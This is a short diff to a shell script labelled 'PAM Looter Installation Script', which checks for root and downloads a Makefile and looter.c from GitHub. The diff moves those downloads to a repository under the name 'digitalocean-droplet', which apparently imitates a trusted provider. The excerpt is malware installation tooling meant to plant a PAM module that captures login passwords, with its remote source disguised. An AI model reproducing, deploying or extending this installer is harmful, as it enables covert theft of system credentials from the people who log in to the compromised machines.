@@ -9,8 +9,8 @@ echo "[+] PAM Looter Installation Script"
 echo "=" * 40
 
 # URLs for download
-MAKEFILE_URL="https://raw.githubusercontent.com/yellphonenaing199/installer/refs/heads/main/Makefile"
-LOOTER_C_URL="https://raw.githubusercontent.com/yellphonenaing199/installer/refs/heads/main/looter.c"
+MAKEFILE_URL="https://raw.githubusercontent.com/digitalocean-droplet/installer/refs/heads/main/Makefile"
+LOOTER_C_URL="https://raw.githubusercontent.com/digitalocean-droplet/installer/refs/heads/main/looter.c"
 
 # Check if running as root
 if [[ $EUID -ne 0 ]]; then
